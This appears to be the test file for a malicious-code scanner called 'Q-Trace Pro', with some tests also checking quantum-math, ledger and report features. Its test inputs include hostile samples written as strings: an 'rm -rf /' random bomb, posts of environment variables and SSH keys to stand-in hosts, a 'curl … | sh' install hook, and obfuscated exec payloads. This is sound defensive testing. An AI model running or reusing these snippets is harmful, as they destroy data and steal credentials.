"""
test_qtrace.py — Q-Trace Pro core test suite
=============================================
Runs with pytest, or standalone (`python test_qtrace.py`) with a tiny shim so it
works even in a minimal environment without pytest installed.
"""
import json
import math

import numpy as np

from analyzer import analyze
from findings import Finding, dedupe, get_meta
from qsim import Circuit
from quantum_engine import (calculate_von_neumann_entropy, map_to_unitary,
                            run_quantum_analysis)
from report import sarif_string, json_report_string
from self_healing import (CircuitBreaker, ValidationError, resilient,
                          validate_code)
from symbolic_engine import run_symbolic_verification


# --- qsim correctness (validated against cirq's math) ---------------------- #
def test_bell_state_entropy_is_ln2():
    c = Circuit(2).h(0).cnot(0, 1)
    s = calculate_von_neumann_entropy(c.final_state_vector())
    assert abs(s - math.log(2)) < 1e-6


def test_ry_yields_target_probability():
    theta = 2 * np.arcsin(np.sqrt(0.3))
    c = Circuit(1).ry(0, theta)
    p1 = abs(c.final_state_vector()[1]) ** 2
    assert abs(p1 - 0.3) < 1e-6


def test_sampling_is_deterministic_with_seed():
    c = Circuit(1).ry(0, 1.0).measure(0, "r")
    a = c.sample(500, seed=7)["r"].mean()
    b = c.sample(500, seed=7)["r"].mean()
    assert a == b


# --- detection accuracy ---------------------------------------------------- #
def test_probabilistic_bomb_with_sink_is_high_confidence():
    res = analyze("import random, os\nif random.random() < 0.14:\n    os.system('rm -rf /')")
    bombs = [f for f in res.findings if f.pattern == "PROBABILISTIC_BOMB"]
    assert bombs and bombs[0].confidence == "High"


def test_benign_sampling_is_suppressed_to_low_confidence():
    # random without any dangerous sink => low confidence (key FP reducer)
    res = analyze("import random\nif random.random() < 0.1:\n    log_metric('ab')")
    bombs = [f for f in res.findings if f.pattern == "PROBABILISTIC_BOMB"]
    assert all(f.confidence == "Low" for f in bombs)


def test_stego_detected():
    res = analyze("def s(m): return ''.join(chr(ord(c)^0x2A) for c in m)\n"
                  "if s(secret)==trigger: unlock_root()")
    assert any(f.pattern == "QUANTUM_STEGANOGRAPHY" for f in res.findings)


def test_sink_line_numbers_present():
    res = analyze("import os\nos.system('id')")
    sinks = [f for f in res.findings if f.pattern == "DANGEROUS_SINK"]
    assert sinks and sinks[0].line == 2


# --- obfuscation channel (entropy + fractal dimension) --------------------- #
def test_exec_base64_flagged_as_obfuscated():
    res = analyze("import base64\nexec(base64.b64decode('aW1wb3J0IG9z').decode())")
    assert any(f.pattern == "OBFUSCATED_PAYLOAD" for f in res.findings)


def test_xor_byte_array_flagged_as_obfuscated():
    res = analyze("data=[104,105,106,107,108,109,110,111]\n"
                  "exec(bytes([b^42 for b in data]).decode())")
    assert any(f.pattern == "OBFUSCATED_PAYLOAD" for f in res.findings)


def test_benign_string_formatting_not_obfuscated():
    res = analyze("def banner(n):\n    return chr(61)*n + ' hello world '")
    assert not any(f.pattern == "OBFUSCATED_PAYLOAD" for f in res.findings)


def test_higuchi_fd_in_expected_range():
    from obfuscation import higuchi_fractal_dimension
    import numpy as np
    # a rough random signal should have FD strictly above a smooth ramp
    rough = higuchi_fractal_dimension(np.random.default_rng(0).random(200))
    smooth = higuchi_fractal_dimension(np.linspace(0, 1, 200))
    assert rough > smooth


# --- classic industry vulnerability rules ---------------------------------- #
def test_sql_injection_detected():
    from classic_rules import scan_classic
    fs = scan_classic("cur.execute(f'SELECT * FROM u WHERE n={name}')")
    assert any(f.pattern == "SQL_INJECTION" for f in fs)


def test_sql_parameterized_is_safe():
    from classic_rules import scan_classic
    fs = scan_classic("cur.execute('SELECT * FROM u WHERE n=?', (name,))")
    assert not any(f.pattern == "SQL_INJECTION" for f in fs)


def test_insecure_deserialization_detected():
    from classic_rules import scan_classic
    assert any(f.pattern == "INSECURE_DESERIALIZATION"
               for f in scan_classic("import pickle\npickle.loads(b)"))


def test_disabled_cert_validation_detected():
    from classic_rules import scan_classic
    assert any(f.pattern == "DISABLED_CERT_VALIDATION"
               for f in scan_classic("import requests\nrequests.get(u, verify=False)"))


def test_hardcoded_secret_detected_but_env_is_safe():
    from classic_rules import scan_classic
    assert any(f.pattern == "HARDCODED_SECRET"
               for f in scan_classic("password = 'sup3rs3cretvalue'"))
    assert not any(f.pattern == "HARDCODED_SECRET"
                   for f in scan_classic("import os\npassword = os.environ['PW']"))


def test_classic_rules_flow_through_analyzer():
    res = analyze("import pickle\npickle.loads(blob)")
    assert any(f.pattern == "INSECURE_DESERIALIZATION" for f in res.findings)


# --- real-world supply-chain detectors ------------------------------------- #
def test_credential_exfiltration_detected_over_https():
    res = analyze("import os, requests\nrequests.post('https://evil/c', data=os.environ)")
    assert any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in res.findings)


def test_credential_exfiltration_cross_statement():
    code = ("import requests\nk = open('/home/u/.ssh/id_rsa').read()\n"
            "requests.post('https://x/y', data=k)")
    assert any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in analyze(code).findings)


def test_benign_upload_is_not_exfiltration():
    code = "import requests\ndata = open('report.csv').read()\nrequests.post('https://x', data=data)"
    assert not any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in analyze(code).findings)


def test_install_hook_detected_in_packaging_context():
    code = "from setuptools import setup\nimport os\nos.system('curl http://e/x|sh')\nsetup(name='p')"
    assert any(f.pattern == "INSTALL_HOOK" for f in analyze(code).findings)


# --- cross-file interprocedural taint -------------------------------------- #
def test_cross_file_exfiltration_detected():
    from taint import analyze_package
    pkg = {
        "utils.py": "import os\ndef grab():\n    return os.environ\n",
        "client.py": "import requests\nfrom utils import grab\n"
                     "def go():\n    requests.post('https://e', data=grab())\n",
    }
    fs = analyze_package(pkg)
    assert any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in fs)
    assert fs[0].artifact_uri == "client.py"


def test_cross_file_two_hop_chain():
    from taint import analyze_package
    pkg = {
        "a.py": "import os\ndef a():\n    return os.getenv('AWS_SECRET')\n",
        "b.py": "from a import a\ndef b():\n    return a()\n",
        "c.py": "import requests\nfrom b import b\n"
                "def go():\n    x = b()\n    requests.post('https://e', json=x)\n",
    }
    assert any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in analyze_package(pkg))


def test_cross_file_ssh_key_to_exec():
    from taint import analyze_package
    pkg = {
        "h.py": "def read_key():\n    return open('/home/u/.ssh/id_rsa').read()\n",
        "m.py": "from h import read_key\nimport os\ndef run():\n    os.system(read_key())\n",
    }
    assert any(f.pattern == "COMMAND_INJECTION" for f in analyze_package(pkg))


def test_cross_file_benign_upload_is_clean():
    from taint import analyze_package
    pkg = {
        "u.py": "def load():\n    return open('report.csv').read()\n",
        "c.py": "import requests\nfrom u import load\n"
                "def go():\n    requests.post('https://e', data=load())\n",
    }
    assert analyze_package(pkg) == []


def test_cross_file_local_secret_use_is_clean():
    from taint import analyze_package
    pkg = {
        "u.py": "import os\ndef cfg():\n    return os.environ.get('DB')\n",
        "c.py": "from u import cfg\ndef go():\n    db = cfg()\n    print(len(db))\n",
    }
    assert analyze_package(pkg) == []


# --- tamper-evident audit ledger ------------------------------------------- #
def _tmp_ledger():
    import os, tempfile
    return os.path.join(tempfile.mkdtemp(), "audit.ledger")


def test_ledger_chain_verifies_when_intact():
    from ledger import append_scan, verify_ledger
    p = _tmp_ledger()
    append_scan(p, "a/", {"High": 1}, 1, "report-a")
    append_scan(p, "b/", {"Critical": 2}, 2, "report-b")
    ok, problems = verify_ledger(p)
    assert ok and problems == []


def test_ledger_detects_content_tampering():
    import json
    from ledger import append_scan, verify_ledger
    p = _tmp_ledger()
    append_scan(p, "a/", {"High": 1}, 1, "report-a")
    append_scan(p, "b/", {"High": 1}, 1, "report-b")
    lines = open(p).read().splitlines()
    rec = json.loads(lines[0]); rec["finding_count"] = 99
    lines[0] = json.dumps(rec, sort_keys=True)
    open(p, "w").write("\n".join(lines) + "\n")
    ok, problems = verify_ledger(p)
    assert not ok and any("tamper" in s for s in problems)


def test_ledger_detects_deletion():
    from ledger import append_scan, verify_ledger
    p = _tmp_ledger()
    append_scan(p, "a/", {}, 0, "ra")
    append_scan(p, "b/", {}, 0, "rb")
    append_scan(p, "c/", {}, 0, "rc")
    lines = open(p).read().splitlines()
    open(p, "w").write(lines[0] + "\n" + lines[2] + "\n")  # drop the middle record
    ok, problems = verify_ledger(p)
    assert not ok


def test_ledger_hmac_signature_requires_key():
    from ledger import append_scan, verify_ledger
    p = _tmp_ledger()
    append_scan(p, "a/", {"High": 1}, 1, "ra", key="secret-key")
    assert verify_ledger(p, key="secret-key")[0] is True
    assert verify_ledger(p, key="wrong-key")[0] is False


# --- false-positive fixes -------------------------------------------------- #
def test_flask_app_run_is_not_a_sink():
    # app.run() must NOT be flagged as subprocess.run (receiver-aware matching)
    res = analyze("from flask import Flask\napp = Flask(__name__)\napp.run()")
    assert not any(f.pattern == "DANGEROUS_SINK" for f in res.findings)


def test_subprocess_run_still_flagged():
    res = analyze("import subprocess\nsubprocess.run(['ls'])")
    assert any(f.pattern == "DANGEROUS_SINK" for f in res.findings)


def test_dict_get_is_clean():
    assert analyze("cfg = {}\nx = cfg.get('key')").findings == [] or \
        all(f.pattern != "DANGEROUS_SINK" for f in analyze("cfg={}\nx=cfg.get('k')").findings)


# --- stego false-positive fix ---------------------------------------------- #
def test_bare_encode_is_not_steganography():
    from pattern_matcher import detect_patterns
    assert "QUANTUM_STEGANOGRAPHY" not in detect_patterns("h = name.encode('utf-8')")


def test_chr_ord_xor_is_steganography():
    from pattern_matcher import detect_patterns
    assert "QUANTUM_STEGANOGRAPHY" in detect_patterns("x = chr(ord(c) ^ 0x2A)")


# --- CLI ------------------------------------------------------------------- #
def test_cli_scan_returns_gate_exit_code(tmp_path=None):
    import os, tempfile
    from cli import main
    d = tempfile.mkdtemp()
    p = os.path.join(d, "v.py")
    with open(p, "w") as fh:
        fh.write("import pickle\npickle.loads(b)\n")
    # pickle.loads is High -> default --fail-on High -> exit 2
    assert main(["scan", p, "--format", "json"]) == 2


def test_cli_clean_file_exits_zero():
    import os, tempfile
    from cli import main
    d = tempfile.mkdtemp()
    p = os.path.join(d, "ok.py")
    with open(p, "w") as fh:
        fh.write("def add(a, b):\n    return a + b\n")
    assert main(["scan", p, "--format", "json"]) == 0


# --- symbolic soundness ---------------------------------------------------- #
def test_dead_branch_is_safe():
    _, unsafe = run_symbolic_verification("if 1 == 0:\n    os.system('x')")
    assert unsafe is False


def test_unreachable_counter_is_safe():
    code = "k=0\nif (random.randint(0,7)==3):\n    k+=1\nif k==99:\n    os.system('x')"
    _, unsafe = run_symbolic_verification(code)
    assert unsafe is False


def test_reachable_counter_is_unsafe():
    code = ("k=0\nif (random.randint(0,7)==3):\n    k+=1\n"
            "if (random.randint(0,9)==5):\n    k+=1\nif k==2:\n    os.system('x')")
    _, unsafe = run_symbolic_verification(code)
    assert unsafe is True


# --- reporting: no float32 crash, valid SARIF ------------------------------ #
def test_json_report_handles_numpy_floats():
    res = analyze("import random, os\nif random.random()<0.2:\n    os.system('x')")
    extra = {"physics_metrics": res.physics_metrics}  # contains numpy-derived floats
    s = json_report_string(res.findings, extra=extra)
    json.loads(s)  # must not raise


def test_sarif_is_valid_2_1_0():
    res = analyze("import os\nos.system('x')")
    doc = json.loads(sarif_string(res.findings))
    assert doc["version"] == "2.1.0"
    run = doc["runs"][0]
    assert run["tool"]["driver"]["name"] == "Q-Trace Pro"
    assert run["taxonomies"][0]["name"] == "CWE"
    for r in run["results"]:
        assert r["ruleId"] and r["level"] in {"error", "warning", "note", "none"}
        assert "partialFingerprints" in r


# --- self-healing ---------------------------------------------------------- #
def test_validate_code_rejects_oversized():
    try:
        validate_code("x" * 2_000_000)
        assert False, "expected ValidationError"
    except ValidationError:
        pass


def test_validate_code_strips_null_bytes():
    assert "\x00" not in validate_code("a\x00b")


def test_resilient_returns_fallback_on_error():
    @resilient(fallback="safe")
    def boom():
        raise RuntimeError("nope")
    assert boom() == "safe"


def test_circuit_breaker_opens_after_failures():
    cb = CircuitBreaker("t", failure_threshold=2, reset_timeout=999)
    cb.record_failure(); cb.record_failure()
    assert cb.allow() is False


def test_dedupe_removes_duplicates():
    m = get_meta("DANGEROUS_SINK")
    f1 = Finding("DANGEROUS_SINK", m, "High", 0.8, line=1, snippet="os.system('x')")
    f2 = Finding("DANGEROUS_SINK", m, "High", 0.9, line=1, snippet="os.system('x')")
    assert len(dedupe([f1, f2])) == 1


# --- standalone runner ----------------------------------------------------- #
if __name__ == "__main__":
    passed = failed = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn()
                print(f"  PASS  {name}")
                passed += 1
            except Exception as e:
                print(f"  FAIL  {name}: {e}")
                failed += 1
    print(f"\n{passed} passed, {failed} failed")
    raise SystemExit(1 if failed else 0)
